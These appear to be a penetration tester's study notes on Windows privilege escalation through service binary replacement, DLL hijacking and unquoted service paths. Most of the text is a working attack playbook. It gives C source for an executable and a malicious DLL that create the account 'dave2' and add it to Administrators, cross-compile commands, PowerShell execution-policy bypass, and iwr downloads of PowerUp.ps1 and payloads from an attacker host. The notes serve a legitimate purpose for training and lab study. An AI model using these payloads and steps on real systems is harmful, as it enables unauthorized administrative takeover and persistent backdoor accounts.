
Windows Services are long-running background executable or applications managed by the `Service Control Manager`.

They can be manage by the `Services snap-in`, `PowerShell`, or `sc.exe command line tool`.

Windows uses the `LocalSystem`, `Network Service`, and `Local Service`, user accounts to run its own services.

Users or programs creating a service can choose either one of the accounts from the above, a domain user or a local user.

#### Service Binary Hijacking

We can check installed services using `services.msc`, `Get-Service`, or `Get-CimInstance`

`Get-Service and Get-CimInstance` requires administrative user when using shell (UAC), but can be used with RDP.

`Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}` get services running under the win32 service class and only read the name, state and pathname of running services - we should look for service binaries out side of system32, these binaries are managed and installed by users, which could result in poor permissions/management of binary

binary permissions:

`I` indicates that the permission is inherent of the parent directory, without `I` we can draw the conclusion that the binary's permissions was set on purpose to that permission.

| MASK | PERMISSIONS             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

`icacls "C:\xampp\apache\bin\httpd.exe"` or `Get-ACL "C:\xampp\apache\bin\httpd.exe"` - read binary permissions

If we find a service that we can replace, we can replace it with the below binary to add our own administrative user.

```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe` - we can cross-compile our binary for a 64 bit system

`Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}` - check the start mode of a specific service to determine how we will restart the service

`whoami /priv` - list out privileges to see if we can restart the system to refresh the binary (if the startup is set to auto, we need `SeShutdownPrivilege)` (state is for the current command whoami, we only need to see the presence of the privilege)

`net stop mysql` & `net start mysql` stop and start a service to reset the binary for PrivEsc 

`shutdown /r /t 0` - reboot the machine in zero seconds if we need to reboot

*after reboot check if the binary as worked, maybe check the administrators group to see if our user was added*

`If we have gui access and have successfully added a new user, we may need to spawn an administrative powershell and log in with the new users credentials to get privileges we need to access other folders on the system like other admin folders.`

#### Automate service hijacking

We can use `/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1` to detect an escalation vector on a windows system.

```
iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1

powershell -ep bypass

 . .\PowerUp.ps1
 
Get-ModifiableServiceFile
```

`Install-ServiceBinary -Name 'mysql'` replace the service binary with out malicious binary which by default adds a new user `john` with the password `Password123!` to the `administrators group`


#### Service DLL Hijacking

Generally used when the user does not have permission to replace service binaries - like done above.

DLLs (dynamic link libraries) provide some functionality for programs or the operating systems, such as code of resources like icons, or other executable files. They are the equivalent of Unix shared objects.

DLL hijacking work similar to service hijacking, where instead of overwriting the service we overwrite the DLL which is executed by the service. In a lot of cases this will stop the service from working as necessary functionality is missing from the DLL - but in most cases will still result in the DLL executing, granting elevated access.

Microsoft introduced a DLL search order to prevent or minimize DLL hijacking - but this can also be hijacked.

The standard search order looks like when `safe DLL search` is enabled:

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

When safe DLL search is not enabled the current directory is number 2 in the hierarchy.

In special cases there may be a missing DLL for a program as a result of a flawed installation process. If this cases arises we can simply place a malicious DLL somewhere in the path of the search order.

##### About DLLs

Each DLLs can have an option entry point `DllMain` which is executed when processes or threads attach the DLL. 

DllMain contains four cases:
- DLL_PROCESS_ATTACH
- DLL_THREAD_ATTACH
- DLL_THREAD_DETACH
- DLL_PROCESS_DETACH

These cases handle when the DLL is attached or detached and are commonly used for initialization tasks. `Without DllMain the DLL can only provide resources`.

Below is an example of DLL with DllMain in c++:

```
BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

##### Methodology

`Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}` - enumerate the system services

`icacls .\Documents\BetaServ.exe` - check our permissions on a service were interested in, If we have write permissions we could just replace the service, but in the case we don't we need to investigate further.

`monitor the service` - in order to monitor what the service is doing we can use `Process Monitor` to display information about any process, thread, file system or registry related activities. We can use this to detect what DLLs a service is using, their permissions, and possible DLLs that are missing. We need `Administrative privileges` to achieve this. So generally the next step is to copy the service binary to our local machine, and then use this machine to run `Procmon` and investigate the binary.

`configure filter for Procmon` - once we have procmon running, configure a filter in the filter menu. Filter by `Process Name is <Service.exe> then include`, then click add.

`Restart-Service <Service_name>` - after configuration is done, restart the service so that we can analyze the loading of the DLLs the binary needs.

Once a service has restarted we can check procmon for actions made by `CreateFile`. 

once we have found a DLL that is missing or we have permissions to write to, create our malicious DLL using c/c++:

```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

`x86_64-w64-mingw32-gcc myDLL.c --shared -o myDLL.dll` - compile our DLL with `--shared` to signify this is a DLL

Then transfer the DLL to the correct directory on the target machine. `use iwr in powershell to retrieve from a python webserver on the attacker`.

Restart the service. Confirm we have added the user with `net user` and `net localgroup administrators`.

### Unquoted Service Paths

This attack can be used when we have write permissions to a services main directory or subdirectories but cannot replace the files within.

Service Paths that are not enclosed in quotes and have one or more spaces will be interpreted left to right with each word appended + .exe until a file is found to run the service. This is handled by the windows CreateProcess function.

example:

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

So, In order to exploit this vulnerability we need to place a malicious exe somewhere in the path during the interpretation process and have it interpreted as a correct path. We will need to find where in the path we have write permissions to write out binary to. 

##### Methodology

`Get-CimInstance -ClassName win32_service | Select Name,State,PathName` enumerate running and stopped services to find a target service we may be able to exploit - look for unquoted paths in the `PathName` that have spaces.

`wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """"` we can also use this command as a more effective way.  It will only look for services outside of the windows directory and only paths without quotes.

`Start-Service <service>` && `Stop-Service <service>` ensure that we can start and stop the service. Without this we may need to reboot the system if we are able to.

Then complete the process of mapping out which  paths windows CreateProcess is going to try in order to start the process.

Then check our access rights to these paths with `icacls`. Find a path where we have 'W' privileges. 


Once we find a writeable path, we can exploit it:

```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

`x86_64-w64-mingw32-gcc adduser.c -o service.exe` - compile and transfer our binary to the target location

```
iwr -uri http://192.168.119.3/adduser.exe -Outfile Current.exe

copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```

Then, start the original service to trigger our exploit - we may get an error, but try confirming if it worked anyway.

run net user and localgroup administrators to confirm it worked.

##### Methodology 2

we can also make use of `PowerUp.ps1`

here we download the powerup PowerShell script, use execution policy bypass, run the scripts and use the function for finding vulnerable unquoted services:

```
iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1

powershell -ep bypass

. .\PowerUp.ps1

Get-UnquotedService
```

We can then use the abuse function to exploit this:

```
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"

Restart-Service GammaService

net user

net localgroup administrators
```

This will add an administrative user for us names john.